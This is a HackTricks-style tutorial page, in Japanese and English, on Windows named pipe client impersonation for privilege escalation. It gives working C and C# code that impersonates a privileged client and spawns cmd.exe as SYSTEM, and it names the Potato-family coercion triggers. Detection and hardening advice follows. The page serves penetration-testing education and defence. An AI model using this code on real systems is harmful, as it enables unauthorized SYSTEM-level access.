# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation は、接続するクライアントのセキュリティコンテキストを名前付きパイプのサーバースレッドが引き受けることを可能にするローカル権限昇格のプリミティブです。実際には、SeImpersonatePrivilege を持ってコードを実行できる攻撃者は、特権を持つクライアント（例: SYSTEM サービス）を攻撃者制御下のパイプに接続させ、ImpersonateNamedPipeClient を呼び出し、得られたトークンをプライマリトークンに複製してプロセスをクライアントとして生成する（多くの場合 NT AUTHORITY\SYSTEM）ことができます。

このページではコア技術に焦点を当てます。SYSTEM をあなたのパイプに誘導するエンドツーエンドのエクスプロイトチェーンについては、下記の Potato family ページを参照してください。

## TL;DR
- Create a named pipe: \\.\pipe\<random> を作成して接続を待つ。
- 特権を持つコンポーネントをそれに接続させる (spooler/DCOM/EFSRPC/etc.)。
- パイプから少なくとも1メッセージを読み取り、その後 ImpersonateNamedPipeClient を呼び出す。
- 現在のスレッドからインパーソネーショントークンを開き、DuplicateTokenEx(TokenPrimary)、CreateProcessWithTokenW/CreateProcessAsUser で SYSTEM プロセスを取得する。

## 要件と主要な APIs
- 呼び出し元のプロセス/スレッドが通常必要とする権限:
- SeImpersonatePrivilege — 接続してくるクライアントを正しくインパーソネートし、CreateProcessWithTokenW を使用するために必要。
- 代替手段として、SYSTEM をインパーソネートした後に CreateProcessAsUser を使用することもでき、その場合 SeAssignPrimaryTokenPrivilege と SeIncreaseQuotaPrivilege が必要になることがある（これらは SYSTEM をインパーソネートしている間は満たされる）。
- 使用される主要な API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (インパーソネーションの前に少なくとも1メッセージを読み取る必要がある)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- インパーソネーションレベル: ローカルで有用な操作を行うには、クライアントが SecurityImpersonation を許可している必要がある（多くのローカル RPC/名前付きパイプクライアントのデフォルト）。クライアントはパイプを開く際に SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION でこれを下げることができる。

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
注意:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), まずパイプから読み取ることと、クライアントがインパーソネーションを Identification レベルに制限していないことを確認してください。
- プロセス作成に適したプライマリトークンを作成するには、SecurityImpersonation と TokenPrimary を指定した DuplicateTokenEx を使用することを推奨します。

## .NET の簡単な例
.NET では、NamedPipeServerStream は RunAsClient を使ってインパーソネートできます。インパーソネートしたら、スレッドトークンを複製してプロセスを作成します。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEMをあなたのパイプに接続させる一般的なトリガー/強制手法
これらの手法は特権サービスにあなたの named pipe に接続させ、インパーソネートできるようにします:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## トラブルシューティングと注意点
- ImpersonateNamedPipeClient を呼ぶ前に、パイプから少なくとも1つのメッセージを読み取る必要があります。そうしないと ERROR_CANNOT_IMPERSONATE (1368) が返ります。
- クライアントが SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION で接続した場合、サーバは完全にインパーソネートできません。GetTokenInformation(TokenImpersonationLevel) でトークンのインパーソネーションレベルを確認してください。
- CreateProcessWithTokenW は呼び出し元に SeImpersonatePrivilege を要求します。ERROR_PRIVILEGE_NOT_HELD (1314) で失敗する場合は、既に SYSTEM をインパーソネートした後に CreateProcessAsUser を使用してください。
- パイプをハードニングした場合は、パイプのセキュリティ記述子が対象サービスの接続を許可していることを確認してください。デフォルトでは \\.\pipe 以下のパイプはサーバの DACL に従ってアクセス可能です。

## 検出とハードニング
- named pipe の作成と接続を監視します。Sysmon Event IDs 17 (Pipe Created) と 18 (Pipe Connected) は正当なパイプ名のベースライン作成や、トークン操作イベントに先行する異常でランダムに見えるパイプの検出に有用です。
- 次のようなシーケンスを探します: プロセスがパイプを作成 → SYSTEM サービスが接続 → 作成したプロセスが SYSTEM として子プロセスを生成。
- 非必須のサービスアカウントから SeImpersonatePrivilege を削除し、高権限での不要なサービスログオンを避けることで露出を減らします。
- 防御的な開発: 信頼できない named pipe に接続する際は、必要でない限りサーバがクライアントを完全にインパーソネートできないよう、SECURITY_SQOS_PRESENT と SECURITY_IDENTIFICATION を指定してください。

## References
- Windows: ImpersonateNamedPipeClient ドキュメント（インパーソネーション要件と挙動）。 https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation（手順とコード例）。 https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
